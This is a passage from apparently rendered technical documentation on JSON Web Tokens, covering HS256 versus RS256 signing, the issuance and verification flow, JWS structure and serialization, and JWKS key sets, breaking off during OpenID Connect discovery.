<a id="__codelineno-8-24" name="__codelineno-8-24" href="#__codelineno-8-24"></a>    Problem: Both parties need the same secret!            
<a id="__codelineno-8-25" name="__codelineno-8-25" href="#__codelineno-8-25"></a>      If API server is compromised, it can forge tokens       
<a id="__codelineno-8-26" name="__codelineno-8-26" href="#__codelineno-8-26"></a>                                                               
<a id="__codelineno-8-27" name="__codelineno-8-27" href="#__codelineno-8-27"></a>
<a id="__codelineno-8-28" name="__codelineno-8-28" href="#__codelineno-8-28"></a>
<a id="__codelineno-8-29" name="__codelineno-8-29" href="#__codelineno-8-29"></a>
<a id="__codelineno-8-30" name="__codelineno-8-30" href="#__codelineno-8-30"></a>             RSA (Asymmetric) - RS256                         
<a id="__codelineno-8-31" name="__codelineno-8-31" href="#__codelineno-8-31"></a>
<a id="__codelineno-8-32" name="__codelineno-8-32" href="#__codelineno-8-32"></a>                                                               
<a id="__codelineno-8-33" name="__codelineno-8-33" href="#__codelineno-8-33"></a>  Private key for signing, Public key for verifying           
<a id="__codelineno-8-34" name="__codelineno-8-34" href="#__codelineno-8-34"></a>                                                               
<a id="__codelineno-8-35" name="__codelineno-8-35" href="#__codelineno-8-35"></a>        Private Key (kept secret)            
<a id="__codelineno-8-36" name="__codelineno-8-36" href="#__codelineno-8-36"></a>     Issuer                                                 
<a id="__codelineno-8-37" name="__codelineno-8-37" href="#__codelineno-8-37"></a>   (Auth Server)      RSA-SHA256(data, privateKey)         
<a id="__codelineno-8-38" name="__codelineno-8-38" href="#__codelineno-8-38"></a>                                             
<a id="__codelineno-8-39" name="__codelineno-8-39" href="#__codelineno-8-39"></a>                           Signature                          
<a id="__codelineno-8-40" name="__codelineno-8-40" href="#__codelineno-8-40"></a>          Creates JWT                                        
<a id="__codelineno-8-41" name="__codelineno-8-41" href="#__codelineno-8-41"></a>                                                              
<a id="__codelineno-8-42" name="__codelineno-8-42" href="#__codelineno-8-42"></a>  eyJhbGci...SflKxwRJ                                         
<a id="__codelineno-8-43" name="__codelineno-8-43" href="#__codelineno-8-43"></a>                                                              
<a id="__codelineno-8-44" name="__codelineno-8-44" href="#__codelineno-8-44"></a>          Sends JWT                                          
<a id="__codelineno-8-45" name="__codelineno-8-45" href="#__codelineno-8-45"></a>                                                              
<a id="__codelineno-8-46" name="__codelineno-8-46" href="#__codelineno-8-46"></a>        Public Key (can be shared)           
<a id="__codelineno-8-47" name="__codelineno-8-47" href="#__codelineno-8-47"></a>     Verifier                                               
<a id="__codelineno-8-48" name="__codelineno-8-48" href="#__codelineno-8-48"></a>   (API Server)       RSA-Verify(data, signature, pubKey)  
<a id="__codelineno-8-49" name="__codelineno-8-49" href="#__codelineno-8-49"></a>                                             
<a id="__codelineno-8-50" name="__codelineno-8-50" href="#__codelineno-8-50"></a>                            Verify matches                     
<a id="__codelineno-8-51" name="__codelineno-8-51" href="#__codelineno-8-51"></a>                                                               
<a id="__codelineno-8-52" name="__codelineno-8-52" href="#__codelineno-8-52"></a>   Better Security: API server CANNOT create tokens        
<a id="__codelineno-8-53" name="__codelineno-8-53" href="#__codelineno-8-53"></a>     Only auth server with private key can sign               
<a id="__codelineno-8-54" name="__codelineno-8-54" href="#__codelineno-8-54"></a>                                                               
<a id="__codelineno-8-55" name="__codelineno-8-55" href="#__codelineno-8-55"></a>
</code></pre></div>
<hr />
<h2 id="jwt-issuance-flow">JWT Issuance Flow</h2>
<h3 id="complete-authentication-flow">Complete Authentication Flow</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>                                              
<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>  Client                                                 Auth Server  
<a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a> (Browser)                                                 (Issuer)   
<a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>                                              
<a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a>                                                                 
<a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a>       1. Login Request (POST /login)                           
<a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a>         {username: &quot;john&quot;, password: &quot;secret&quot;}                 
<a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a>     &gt;
<a id="__codelineno-9-9" name="__codelineno-9-9" href="#__codelineno-9-9"></a>                                                                 
<a id="__codelineno-9-10" name="__codelineno-9-10" href="#__codelineno-9-10"></a>                                        2. Validate Credentials 
<a id="__codelineno-9-11" name="__codelineno-9-11" href="#__codelineno-9-11"></a>                                            Check DB           
<a id="__codelineno-9-12" name="__codelineno-9-12" href="#__codelineno-9-12"></a>                                            Verify password    
<a id="__codelineno-9-13" name="__codelineno-9-13" href="#__codelineno-9-13"></a>                                                                
<a id="__codelineno-9-14" name="__codelineno-9-14" href="#__codelineno-9-14"></a>                                        3. Create JWT           
<a id="__codelineno-9-15" name="__codelineno-9-15" href="#__codelineno-9-15"></a>                                                
<a id="__codelineno-9-16" name="__codelineno-9-16" href="#__codelineno-9-16"></a>                                            HEADER            
<a id="__codelineno-9-17" name="__codelineno-9-17" href="#__codelineno-9-17"></a>                                            {&quot;alg&quot;:&quot;RS256&quot;}    
<a id="__codelineno-9-18" name="__codelineno-9-18" href="#__codelineno-9-18"></a>                                                
<a id="__codelineno-9-19" name="__codelineno-9-19" href="#__codelineno-9-19"></a>                                                
<a id="__codelineno-9-20" name="__codelineno-9-20" href="#__codelineno-9-20"></a>                                            PAYLOAD           
<a id="__codelineno-9-21" name="__codelineno-9-21" href="#__codelineno-9-21"></a>                                            {sub: &quot;123&quot;}      
<a id="__codelineno-9-22" name="__codelineno-9-22" href="#__codelineno-9-22"></a>                                            {exp: ...}        
<a id="__codelineno-9-23" name="__codelineno-9-23" href="#__codelineno-9-23"></a>                                                
<a id="__codelineno-9-24" name="__codelineno-9-24" href="#__codelineno-9-24"></a>                                                
<a id="__codelineno-9-25" name="__codelineno-9-25" href="#__codelineno-9-25"></a>                                            SIGNATURE         
<a id="__codelineno-9-26" name="__codelineno-9-26" href="#__codelineno-9-26"></a>                                            (with priv key)    
<a id="__codelineno-9-27" name="__codelineno-9-27" href="#__codelineno-9-27"></a>                                                
<a id="__codelineno-9-28" name="__codelineno-9-28" href="#__codelineno-9-28"></a>                                                                
<a id="__codelineno-9-29" name="__codelineno-9-29" href="#__codelineno-9-29"></a>       4. Return JWT                                            
<a id="__codelineno-9-30" name="__codelineno-9-30" href="#__codelineno-9-30"></a>       {token: &quot;eyJhbGci...&quot;, expiresIn: 3600}                  
<a id="__codelineno-9-31" name="__codelineno-9-31" href="#__codelineno-9-31"></a>     &lt;
<a id="__codelineno-9-32" name="__codelineno-9-32" href="#__codelineno-9-32"></a>                                                                 
<a id="__codelineno-9-33" name="__codelineno-9-33" href="#__codelineno-9-33"></a>       5. Store JWT (localStorage/cookie)                       
<a id="__codelineno-9-34" name="__codelineno-9-34" href="#__codelineno-9-34"></a>        Saved                                                 
<a id="__codelineno-9-35" name="__codelineno-9-35" href="#__codelineno-9-35"></a>                                                                 
<a id="__codelineno-9-36" name="__codelineno-9-36" href="#__codelineno-9-36"></a>                                                                 
<a id="__codelineno-9-37" name="__codelineno-9-37" href="#__codelineno-9-37"></a>
<a id="__codelineno-9-38" name="__codelineno-9-38" href="#__codelineno-9-38"></a>
<a id="__codelineno-9-39" name="__codelineno-9-39" href="#__codelineno-9-39"></a>                                              
<a id="__codelineno-9-40" name="__codelineno-9-40" href="#__codelineno-9-40"></a>  Client                                                  API Server  
<a id="__codelineno-9-41" name="__codelineno-9-41" href="#__codelineno-9-41"></a> (Browser)                                                (Resource)  
<a id="__codelineno-9-42" name="__codelineno-9-42" href="#__codelineno-9-42"></a>                                              
<a id="__codelineno-9-43" name="__codelineno-9-43" href="#__codelineno-9-43"></a>                                                                 
<a id="__codelineno-9-44" name="__codelineno-9-44" href="#__codelineno-9-44"></a>       6. API Request with JWT                                  
<a id="__codelineno-9-45" name="__codelineno-9-45" href="#__codelineno-9-45"></a>       GET /api/user/profile                                    
<a id="__codelineno-9-46" name="__codelineno-9-46" href="#__codelineno-9-46"></a>       Authorization: Bearer eyJhbGci...                        
<a id="__codelineno-9-47" name="__codelineno-9-47" href="#__codelineno-9-47"></a>     &gt;
<a id="__codelineno-9-48" name="__codelineno-9-48" href="#__codelineno-9-48"></a>                                                                 
<a id="__codelineno-9-49" name="__codelineno-9-49" href="#__codelineno-9-49"></a>                                        7. Verify JWT           
<a id="__codelineno-9-50" name="__codelineno-9-50" href="#__codelineno-9-50"></a>                                                
<a id="__codelineno-9-51" name="__codelineno-9-51" href="#__codelineno-9-51"></a>                                            Extract JWT       
<a id="__codelineno-9-52" name="__codelineno-9-52" href="#__codelineno-9-52"></a>                                                
<a id="__codelineno-9-53" name="__codelineno-9-53" href="#__codelineno-9-53"></a>                                                                
<a id="__codelineno-9-54" name="__codelineno-9-54" href="#__codelineno-9-54"></a>                                                
<a id="__codelineno-9-55" name="__codelineno-9-55" href="#__codelineno-9-55"></a>                                            Split into        
<a id="__codelineno-9-56" name="__codelineno-9-56" href="#__codelineno-9-56"></a>                                            Header.           
<a id="__codelineno-9-57" name="__codelineno-9-57" href="#__codelineno-9-57"></a>                                            Payload.          
<a id="__codelineno-9-58" name="__codelineno-9-58" href="#__codelineno-9-58"></a>                                            Signature         
<a id="__codelineno-9-59" name="__codelineno-9-59" href="#__codelineno-9-59"></a>                                                
<a id="__codelineno-9-60" name="__codelineno-9-60" href="#__codelineno-9-60"></a>                                                                
<a id="__codelineno-9-61" name="__codelineno-9-61" href="#__codelineno-9-61"></a>                                                
<a id="__codelineno-9-62" name="__codelineno-9-62" href="#__codelineno-9-62"></a>                                            Get Public        
<a id="__codelineno-9-63" name="__codelineno-9-63" href="#__codelineno-9-63"></a>                                            Key (JWKS)        
<a id="__codelineno-9-64" name="__codelineno-9-64" href="#__codelineno-9-64"></a>                                                
<a id="__codelineno-9-65" name="__codelineno-9-65" href="#__codelineno-9-65"></a>                                                                
<a id="__codelineno-9-66" name="__codelineno-9-66" href="#__codelineno-9-66"></a>                                                
<a id="__codelineno-9-67" name="__codelineno-9-67" href="#__codelineno-9-67"></a>                                            Verify            
<a id="__codelineno-9-68" name="__codelineno-9-68" href="#__codelineno-9-68"></a>                                            Signature         
<a id="__codelineno-9-69" name="__codelineno-9-69" href="#__codelineno-9-69"></a>                                                
<a id="__codelineno-9-70" name="__codelineno-9-70" href="#__codelineno-9-70"></a>                                                                
<a id="__codelineno-9-71" name="__codelineno-9-71" href="#__codelineno-9-71"></a>                                                
<a id="__codelineno-9-72" name="__codelineno-9-72" href="#__codelineno-9-72"></a>                                            Validate          
<a id="__codelineno-9-73" name="__codelineno-9-73" href="#__codelineno-9-73"></a>                                            Claims            
<a id="__codelineno-9-74" name="__codelineno-9-74" href="#__codelineno-9-74"></a>                                            (exp, aud)        
<a id="__codelineno-9-75" name="__codelineno-9-75" href="#__codelineno-9-75"></a>                                                
<a id="__codelineno-9-76" name="__codelineno-9-76" href="#__codelineno-9-76"></a>                                                                
<a id="__codelineno-9-77" name="__codelineno-9-77" href="#__codelineno-9-77"></a>                                            Valid             
<a id="__codelineno-9-78" name="__codelineno-9-78" href="#__codelineno-9-78"></a>                                                                
<a id="__codelineno-9-79" name="__codelineno-9-79" href="#__codelineno-9-79"></a>       8. Return Protected Resource                             
<a id="__codelineno-9-80" name="__codelineno-9-80" href="#__codelineno-9-80"></a>       {id: 123, name: &quot;John&quot;, email: &quot;...&quot;}                    
<a id="__codelineno-9-81" name="__codelineno-9-81" href="#__codelineno-9-81"></a>     &lt;
<a id="__codelineno-9-82" name="__codelineno-9-82" href="#__codelineno-9-82"></a>                                                                 
<a id="__codelineno-9-83" name="__codelineno-9-83" href="#__codelineno-9-83"></a>     
</code></pre></div>
<hr />
<h2 id="jws-json-web-signature">JWS (JSON Web Signature)</h2>
<p><strong>JWS</strong> is the specification (RFC 7515) that defines how to digitally sign content using JSON. <strong>JWT is actually a type of JWS</strong> with JSON claims in the payload.</p>
<h3 id="jws-structure">JWS Structure</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>
<a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>                    JWS Components                          
<a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>
<a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a>                                                             
<a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a>  1. JOSE Header (JSON Object Signing and Encryption)       
<a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a>                    
<a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a>     Contains metadata about the signature                  
<a id="__codelineno-10-8" name="__codelineno-10-8" href="#__codelineno-10-8"></a>     {&quot;alg&quot;: &quot;RS256&quot;, &quot;typ&quot;: &quot;JWT&quot;, &quot;kid&quot;: &quot;key-123&quot;}      
<a id="__codelineno-10-9" name="__codelineno-10-9" href="#__codelineno-10-9"></a>                                                             
<a id="__codelineno-10-10" name="__codelineno-10-10" href="#__codelineno-10-10"></a>  2. JWS Payload                                            
<a id="__codelineno-10-11" name="__codelineno-10-11" href="#__codelineno-10-11"></a>                                                
<a id="__codelineno-10-12" name="__codelineno-10-12" href="#__codelineno-10-12"></a>     The actual content being signed                        
<a id="__codelineno-10-13" name="__codelineno-10-13" href="#__codelineno-10-13"></a>     Can be ANY content (not just JWT claims)               
<a id="__codelineno-10-14" name="__codelineno-10-14" href="#__codelineno-10-14"></a>                                                             
<a id="__codelineno-10-15" name="__codelineno-10-15" href="#__codelineno-10-15"></a>  3. JWS Signature                                          
<a id="__codelineno-10-16" name="__codelineno-10-16" href="#__codelineno-10-16"></a>                                              
<a id="__codelineno-10-17" name="__codelineno-10-17" href="#__codelineno-10-17"></a>     Digital signature of header + payload                  
<a id="__codelineno-10-18" name="__codelineno-10-18" href="#__codelineno-10-18"></a>                                                             
<a id="__codelineno-10-19" name="__codelineno-10-19" href="#__codelineno-10-19"></a>
</code></pre></div>
<h3 id="jws-serialization-formats">JWS Serialization Formats</h3>
<p><strong>1. Compact Serialization (Most Common):</strong>
<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>BASE64URL(UTF8(JWS Header)) || &#39;.&#39; ||
<a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>BASE64URL(JWS Payload) || &#39;.&#39; ||
<a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>BASE64URL(JWS Signature)
<a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a>
<a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a>Example:
<a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a>eyJhbGci...J9.eyJzdWI...iJ9.SflKxw...ssw5c
</code></pre></div></p>
<p><strong>2. JSON Serialization (Multiple Signatures):</strong>
<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="p">{</span>
<a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a><span class="w">  </span><span class="nt">&quot;payload&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;eyJzdWI...&quot;</span><span class="p">,</span>
<a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a><span class="w">  </span><span class="nt">&quot;signatures&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
<a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a><span class="w">    </span><span class="p">{</span>
<a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a><span class="w">      </span><span class="nt">&quot;protected&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;eyJhbGci...&quot;</span><span class="p">,</span>
<a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a><span class="w">      </span><span class="nt">&quot;header&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="nt">&quot;kid&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;key-1&quot;</span><span class="p">},</span>
<a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a><span class="w">      </span><span class="nt">&quot;signature&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;DtEhU3...&quot;</span>
<a id="__codelineno-12-8" name="__codelineno-12-8" href="#__codelineno-12-8"></a><span class="w">    </span><span class="p">},</span>
<a id="__codelineno-12-9" name="__codelineno-12-9" href="#__codelineno-12-9"></a><span class="w">    </span><span class="p">{</span>
<a id="__codelineno-12-10" name="__codelineno-12-10" href="#__codelineno-12-10"></a><span class="w">      </span><span class="nt">&quot;protected&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;eyJhbGci...&quot;</span><span class="p">,</span>
<a id="__codelineno-12-11" name="__codelineno-12-11" href="#__codelineno-12-11"></a><span class="w">      </span><span class="nt">&quot;header&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="nt">&quot;kid&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;key-2&quot;</span><span class="p">},</span>
<a id="__codelineno-12-12" name="__codelineno-12-12" href="#__codelineno-12-12"></a><span class="w">      </span><span class="nt">&quot;signature&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;8BYT5X...&quot;</span>
<a id="__codelineno-12-13" name="__codelineno-12-13" href="#__codelineno-12-13"></a><span class="w">    </span><span class="p">}</span>
<a id="__codelineno-12-14" name="__codelineno-12-14" href="#__codelineno-12-14"></a><span class="w">  </span><span class="p">]</span>
<a id="__codelineno-12-15" name="__codelineno-12-15" href="#__codelineno-12-15"></a><span class="p">}</span>
</code></pre></div></p>
<h3 id="jws-vs-jwt">JWS vs JWT</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>
<a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>                       JWS vs JWT                           
<a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>
<a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a>     JWS        Specification for signing JSON content     
<a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a>                Can sign ANY payload                       
<a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a>                RFC 7515                                   
<a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a>
<a id="__codelineno-13-8" name="__codelineno-13-8" href="#__codelineno-13-8"></a>     JWT        Specific use of JWS for authentication     
<a id="__codelineno-13-9" name="__codelineno-13-9" href="#__codelineno-13-9"></a>                Payload MUST be JSON claims                
<a id="__codelineno-13-10" name="__codelineno-13-10" href="#__codelineno-13-10"></a>                RFC 7519                                   
<a id="__codelineno-13-11" name="__codelineno-13-11" href="#__codelineno-13-11"></a>
<a id="__codelineno-13-12" name="__codelineno-13-12" href="#__codelineno-13-12"></a> Relationship   JWT is a JWS with claims as payload       
<a id="__codelineno-13-13" name="__codelineno-13-13" href="#__codelineno-13-13"></a>                Every JWT is a JWS                         
<a id="__codelineno-13-14" name="__codelineno-13-14" href="#__codelineno-13-14"></a>                Not every JWS is a JWT                     
<a id="__codelineno-13-15" name="__codelineno-13-15" href="#__codelineno-13-15"></a>
</code></pre></div>
<hr />
<h2 id="jwks-json-web-key-set">JWKS (JSON Web Key Set)</h2>
<p><strong>JWKS</strong> is a set of public keys used to verify JWTs issued by an authorization server. It's typically exposed as a JSON document at a well-known URL.</p>
<h3 id="jwks-structure">JWKS Structure</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="p">{</span>
<a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a><span class="w">  </span><span class="nt">&quot;keys&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
<a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a><span class="w">    </span><span class="p">{</span>
<a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a><span class="w">      </span><span class="c1">// Key Type</span>
<a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a><span class="w">      </span><span class="nt">&quot;kty&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;RSA&quot;</span><span class="p">,</span>
<a id="__codelineno-14-6" name="__codelineno-14-6" href="#__codelineno-14-6"></a>
<a id="__codelineno-14-7" name="__codelineno-14-7" href="#__codelineno-14-7"></a><span class="w">      </span><span class="c1">// Public Key Use</span>
<a id="__codelineno-14-8" name="__codelineno-14-8" href="#__codelineno-14-8"></a><span class="w">      </span><span class="nt">&quot;use&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;sig&quot;</span><span class="p">,</span>
<a id="__codelineno-14-9" name="__codelineno-14-9" href="#__codelineno-14-9"></a>
<a id="__codelineno-14-10" name="__codelineno-14-10" href="#__codelineno-14-10"></a><span class="w">      </span><span class="c1">// Key ID (for key rotation)</span>
<a id="__codelineno-14-11" name="__codelineno-14-11" href="#__codelineno-14-11"></a><span class="w">      </span><span class="nt">&quot;kid&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;key-2024-01&quot;</span><span class="p">,</span>
<a id="__codelineno-14-12" name="__codelineno-14-12" href="#__codelineno-14-12"></a>
<a id="__codelineno-14-13" name="__codelineno-14-13" href="#__codelineno-14-13"></a><span class="w">      </span><span class="c1">// Algorithm</span>
<a id="__codelineno-14-14" name="__codelineno-14-14" href="#__codelineno-14-14"></a><span class="w">      </span><span class="nt">&quot;alg&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;RS256&quot;</span><span class="p">,</span>
<a id="__codelineno-14-15" name="__codelineno-14-15" href="#__codelineno-14-15"></a>
<a id="__codelineno-14-16" name="__codelineno-14-16" href="#__codelineno-14-16"></a><span class="w">      </span><span class="c1">// RSA Public Key Components</span>
<a id="__codelineno-14-17" name="__codelineno-14-17" href="#__codelineno-14-17"></a><span class="w">      </span><span class="nt">&quot;n&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0vx7agoebGcQSuuPiLJXZptN9nndrQmbXEps2aiAFbWhM78LhWx4cbbfAAt...&quot;</span><span class="p">,</span>
<a id="__codelineno-14-18" name="__codelineno-14-18" href="#__codelineno-14-18"></a><span class="w">      </span><span class="nt">&quot;e&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;AQAB&quot;</span><span class="p">,</span>
<a id="__codelineno-14-19" name="__codelineno-14-19" href="#__codelineno-14-19"></a>
<a id="__codelineno-14-20" name="__codelineno-14-20" href="#__codelineno-14-20"></a><span class="w">      </span><span class="c1">// X.509 Certificate Chain (optional)</span>
<a id="__codelineno-14-21" name="__codelineno-14-21" href="#__codelineno-14-21"></a><span class="w">      </span><span class="nt">&quot;x5c&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;MIIDQjCCAiqgAwIBAgIGATz...&quot;</span><span class="p">],</span>
<a id="__codelineno-14-22" name="__codelineno-14-22" href="#__codelineno-14-22"></a>
<a id="__codelineno-14-23" name="__codelineno-14-23" href="#__codelineno-14-23"></a><span class="w">      </span><span class="c1">// X.509 Thumbprint</span>
<a id="__codelineno-14-24" name="__codelineno-14-24" href="#__codelineno-14-24"></a><span class="w">      </span><span class="nt">&quot;x5t&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;GF8IDz...&quot;</span><span class="p">,</span>
<a id="__codelineno-14-25" name="__codelineno-14-25" href="#__codelineno-14-25"></a><span class="w">      </span><span class="nt">&quot;x5t#S256&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;jMI7H...&quot;</span>
<a id="__codelineno-14-26" name="__codelineno-14-26" href="#__codelineno-14-26"></a><span class="w">    </span><span class="p">},</span>
<a id="__codelineno-14-27" name="__codelineno-14-27" href="#__codelineno-14-27"></a><span class="w">    </span><span class="p">{</span>
<a id="__codelineno-14-28" name="__codelineno-14-28" href="#__codelineno-14-28"></a><span class="w">      </span><span class="nt">&quot;kty&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;RSA&quot;</span><span class="p">,</span>
<a id="__codelineno-14-29" name="__codelineno-14-29" href="#__codelineno-14-29"></a><span class="w">      </span><span class="nt">&quot;use&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;sig&quot;</span><span class="p">,</span>
<a id="__codelineno-14-30" name="__codelineno-14-30" href="#__codelineno-14-30"></a><span class="w">      </span><span class="nt">&quot;kid&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;key-2024-02&quot;</span><span class="p">,</span>
<a id="__codelineno-14-31" name="__codelineno-14-31" href="#__codelineno-14-31"></a><span class="w">      </span><span class="nt">&quot;alg&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;RS256&quot;</span><span class="p">,</span>
<a id="__codelineno-14-32" name="__codelineno-14-32" href="#__codelineno-14-32"></a><span class="w">      </span><span class="nt">&quot;n&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;xjlw2VhYs...&quot;</span><span class="p">,</span>
<a id="__codelineno-14-33" name="__codelineno-14-33" href="#__codelineno-14-33"></a><span class="w">      </span><span class="nt">&quot;e&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;AQAB&quot;</span>
<a id="__codelineno-14-34" name="__codelineno-14-34" href="#__codelineno-14-34"></a><span class="w">    </span><span class="p">}</span>
<a id="__codelineno-14-35" name="__codelineno-14-35" href="#__codelineno-14-35"></a><span class="w">  </span><span class="p">]</span>
<a id="__codelineno-14-36" name="__codelineno-14-36" href="#__codelineno-14-36"></a><span class="p">}</span>
</code></pre></div>
<h3 id="jwks-properties">JWKS Properties</h3>
<table>
<thead>
<tr>
<th>Property</th>
<th>Description</th>
<th>Example</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>kty</strong></td>
<td>Key Type</td>
<td>"RSA", "EC", "oct"</td>
</tr>
<tr>
<td><strong>use</strong></td>
<td>Public Key Use</td>
<td>"sig" (signature), "enc" (encryption)</td>
</tr>
<tr>
<td><strong>key_ops</strong></td>
<td>Key Operations</td>
<td>["sign", "verify"]</td>
</tr>
<tr>
<td><strong>alg</strong></td>
<td>Algorithm</td>
<td>"RS256", "ES256"</td>
</tr>
<tr>
<td><strong>kid</strong></td>
<td>Key ID (unique identifier)</td>
<td>"key-2024-01"</td>
</tr>
<tr>
<td><strong>n</strong></td>
<td>RSA modulus (Base64URL)</td>
<td>"0vx7ago..."</td>
</tr>
<tr>
<td><strong>e</strong></td>
<td>RSA exponent</td>
<td>"AQAB" (65537)</td>
</tr>
<tr>
<td><strong>x5c</strong></td>
<td>X.509 certificate chain</td>
<td>["MIID..."]</td>
</tr>
<tr>
<td><strong>x5t</strong></td>
<td>X.509 SHA-1 thumbprint</td>
<td>"GF8IDz..."</td>
</tr>
<tr>
<td><strong>x5t#S256</strong></td>
<td>X.509 SHA-256 thumbprint</td>
<td>"jMI7H..."</td>
</tr>
<tr>
<td><strong>crv</strong></td>
<td>Elliptic Curve (for EC)</td>
<td>"P-256", "P-384"</td>
</tr>
<tr>
<td><strong>x</strong></td>
<td>EC x coordinate</td>
<td>"f83OJ3..."</td>
</tr>
<tr>
<td><strong>y</strong></td>
<td>EC y coordinate</td>
<td>"x_FEzR..."</td>
</tr>
</tbody>
</table>
<h3 id="jwks-endpoint-discovery">JWKS Endpoint Discovery</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>
<a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>            OpenID Connect Discovery Flow                   
<a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>
<a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a>                                                             
<a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a>  Step 1: Discover OpenID Configuration                     
<a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a>                      
<a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a>  GET https://auth.example.com/.well-known/openid-configuration
<a id="__codelineno-15-8" name="__codelineno-15-8" href="#__codelineno-15-8"></a>                                                             
<a id="__codelineno-15-9" name="__codelineno-15-9" href="#__codelineno-15-9"></a>  Response:                                                  
<a id="__codelineno-15-10" name="__codelineno-15-10" href="#__codelineno-15-10"></a>  {                                                          
<a id="__codelineno-15-11" name="__codelineno-15-11" href="#__codelineno-15-11"></a>    &quot;issuer&quot;: &quot;https://auth.example.com&quot;,                   
<a id="__codelineno-15-12" name="__codelineno-15-12" href="#__codelineno-15-12"></a>    &quot;authorization_endpoint&quot;: &quot;https://auth.../authorize&quot;,  
<a id="__codelineno-15-13" name="__codelineno-15-13" href="#__codelineno-15-13"></a>    &quot;token_endpoint&quot;: &quot;https://auth.../token&quot;,              
<a id="__codelineno-15-14" name="__codelineno-15-14" href="#__codelineno-15-14"></a>    &quot;jwks_uri&quot;: &quot;https://auth.../jwks.json&quot;,   Important! 
